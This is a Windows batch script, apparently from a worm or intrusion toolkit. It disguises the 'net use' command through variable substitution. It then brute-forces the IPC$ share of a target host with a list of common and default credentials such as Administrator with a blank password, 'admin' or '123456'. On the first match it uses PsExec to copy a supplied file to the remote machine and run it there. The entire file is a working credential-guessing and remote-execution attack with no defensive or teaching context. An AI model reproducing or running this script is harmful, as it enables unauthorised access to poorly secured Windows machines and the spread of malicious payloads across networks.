@ECHO OFF
set F=u
set Z=s
set B=n
set L=e
set Q=t
set G=e
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "xxyyzz" /user:Administrator
if not errorlevel 1 goto bluesc4n29
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "abc" /user:admin
if not errorlevel 1 goto bluesc4n30
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "student" /user:student
if not errorlevel 1 goto bluesc4n31
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "teacher" /user:teacher
if not errorlevel 1 goto bluesc4n32
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "" /user:user
if not errorlevel 1 goto bluesc4n33
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "user" /user:user
if not errorlevel 1 goto bluesc4n34
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto bluesc4n4
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto bluesc4n5
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "1" /user:Administrator
if not errorlevel 1 goto bluesc4n26
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "123" /user:Administrator
if not errorlevel 1 goto bluesc4n27
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "12345" /user:admin
if not errorlevel 1 goto bluesc4n28
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto bluesc4n6
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto bluesc4n1
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto bluesc4n35
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto bluesc4n2
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto bluesc4n37
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto bluesc4n3
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto bluesc4n10
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto bluesc4n7
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto bluesc4n8
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto bluesc4n9
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto bluesc4n11
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto bluesc4n12
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto bluesc4n13
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "123456" /user:Administrator
if not errorlevel 1 goto bluesc4n14
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "654321" /user:Administrator
if not errorlevel 1 goto bluesc4n15
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "abc123" /user:Administrator
if not errorlevel 1 goto bluesc4n16
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "12345" /user:Administrator
if not errorlevel 1 goto bluesc4n36
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "red123" /user:Administrator
if not errorlevel 1 goto bluesc4n17
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "admin123" /user:Administrator
if not errorlevel 1 goto bluesc4n18
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto bluesc4n19
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "asdf" /user:Administrator
if not errorlevel 1 goto bluesc4n20
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "password123" /user:Administrator
if not errorlevel 1 goto bluesc4n21
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "secret" /user:Administrator
if not errorlevel 1 goto bluesc4n22
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "qwertyuiop" /user:Administrator
if not errorlevel 1 goto bluesc4n23
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "12345" /user:Administrator
if not errorlevel 1 goto bluesc4n24
%B%%L%%Q% %F%%Z%%G% \\%1\ipc$ "54321" /user:Administrator
if not errorlevel 1 goto bluesc4n25
goto bluesc4nend
:bluesc4n10
Psexec \\%1 -u Administrator -p "admin" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "admin" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "admin" -d %2 -o
goto bluesc4nend
:bluesc4n2
Psexec \\%1 -u Administrator -p "Administrator" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "Administrator" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "Administrator" -d %2 -o
goto bluesc4nend
:bluesc4n37
Psexec \\%1 -u Administrator -p "Administrator" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "Administrator" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "Administrator" -d %2 -o
goto bluesc4nend
:bluesc4n11
Psexec \\%1 -u root -p "root" -d attrib.exe -r %2
Psexec \\%1 -u root -p "root" -f -c -d %2 -o
Psexec \\%1 -u root -p "root" -d %2 -o
goto bluesc4nend
:bluesc4n13
Psexec \\%1 -u admin -p "admin" -d attrib.exe -r %2
Psexec \\%1 -u admin -p "admin" -f -c -d %2 -o
Psexec \\%1 -u admin -p "admin" -d %2 -o
goto bluesc4nend
:bluesc4n3
Psexec \\%1 -u Administrator -p "test" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "test" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "test" -d %2 -o
goto bluesc4nend
:bluesc4n4
Psexec \\%1 -u test -p "test" -d attrib.exe -r %2
Psexec \\%1 -u test -p "test" -f -c -d %2 -o
Psexec \\%1 -u test -p "test" -d %2 -o
goto bluesc4nend
:bluesc4n5
Psexec \\%1 -u Administrator -p "test123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "test123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "test123" -d %2 -o
goto bluesc4nend
:bluesc4n6
Psexec \\%1 -u Administrator -p "temp" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "temp" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "temp" -d %2 -o
goto bluesc4nend
:bluesc4n7
Psexec \\%1 -u Administrator -p "temp123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "temp123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "temp123" -d %2 -o
goto bluesc4nend
:bluesc4n8
Psexec \\%1 -u Administrator -p "pass" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "pass" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "pass" -d %2 -o
goto bluesc4nend
:bluesc4n9
Psexec \\%1 -u Administrator -p "password" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "password" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "password" -d %2 -o
goto bluesc4nend
:bluesc4n12
Psexec \\%1 -u Administrator -p "changeme" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "changeme" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "changeme" -d %2 -o
goto bluesc4nend
:bluesc4n14
Psexec \\%1 -u Administrator -p "123456" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "123456" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "123456" -d %2 -o
goto bluesc4nend
:bluesc4n15
Psexec \\%1 -u Administrator -p "654321" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "654321" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "654321" -d %2 -o
goto bluesc4nend
:bluesc4n16
Psexec \\%1 -u Administrator -p "abc123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "abc123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "abc123" -d %2 -o
goto bluesc4nend
:bluesc4n17
Psexec \\%1 -u Administrator -p "red123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "red123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "red123" -d %2 -o
goto bluesc4nend
:bluesc4n18
Psexec \\%1 -u Administrator -p "admin123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "admin123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "admin123" -d %2 -o
goto bluesc4nend
:bluesc4n19
Psexec \\%1 -u Administrator -p "qwerty" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "qwerty" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "qwerty" -d %2 -o
goto bluesc4nend
:bluesc4n20
Psexec \\%1 -u Administrator -p "asdf" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "asdf" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "asdf" -d %2 -o
goto bluesc4nend
:bluesc4n21
Psexec \\%1 -u Administrator -p "password123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "password123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "password123" -d %2 -o
goto bluesc4nend
:bluesc4n22
Psexec \\%1 -u Administrator -p "secret" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "secret" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "secret" -d %2 -o
goto bluesc4nend
:bluesc4n23
Psexec \\%1 -u Administrator -p "qwertyuiop" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "qwertyuiop" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "qwertyuiop" -d %2 -o
goto bluesc4nend
:bluesc4n24
Psexec \\%1 -u Administrator -p "12345" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "12345" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n25
Psexec \\%1 -u Administrator -p "54321" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "54321" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "54321" -d %2 -o
goto bluesc4nend
:bluesc4n26
Psexec \\%1 -u Administrator -p "1" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "1" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "1" -d %2 -o
goto bluesc4nend
:bluesc4n27
Psexec \\%1 -u Administrator -p "123" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "123" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "123" -d %2 -o
goto bluesc4nend
:bluesc4n28
Psexec \\%1 -u admin -p "12345" -d attrib.exe -r %2
Psexec \\%1 -u admin -p "12345" -f -c -d %2 -o
Psexec \\%1 -u admin -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n29
Psexec \\%1 -u Administrator -p "xxyyzz" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "xxyyzz" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "xxyyzz" -d %2 -o
goto bluesc4nend
:bluesc4n30
Psexec \\%1 -u admin -p "abc" -d attrib.exe -r %2
Psexec \\%1 -u admin -p "abc" -f -c -d %2 -o
Psexec \\%1 -u admin -p "abc" -d %2 -o
goto bluesc4nend
:bluesc4n31
Psexec \\%1 -u student -p "student" -d attrib.exe -r %2
Psexec \\%1 -u student -p "student" -f -c -d %2 -o
Psexec \\%1 -u student -p "student" -d %2 -o
goto bluesc4nend
:bluesc4n32
Psexec \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
Psexec \\%1 -u teacher -p "teacher" -f -c -d %2 -o
Psexec \\%1 -u teacher -p "teacher" -d %2 -o
goto bluesc4nend
:bluesc4n33
Psexec \\%1 -u user -p "" -d attrib.exe -r %2
Psexec \\%1 -u user -p "" -f -c -d %2 -o
Psexec \\%1 -u user -p "" -d %2 -o
goto bluesc4nend
:bluesc4n34
Psexec \\%1 -u user -p "user" -d attrib.exe -r %2
Psexec \\%1 -u user -p "user" -f -c -d %2 -o
Psexec \\%1 -u user -p "user" -d %2 -o
goto bluesc4nend
:bluesc4n35
Psexec \\%1 -u Administrator -p "" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "" -d %2 -o
goto bluesc4nend
:bluesc4n36
Psexec \\%1 -u Administrator -p "12345" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "12345" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n1
Psexec \\%1 -u Administrator -p "" -d attrib.exe -r %2
Psexec \\%1 -u Administrator -p "" -f -c -d %2 -o
Psexec \\%1 -u Administrator -p "" -d %2 -o
goto bluesc4nend
:bluesc4nend
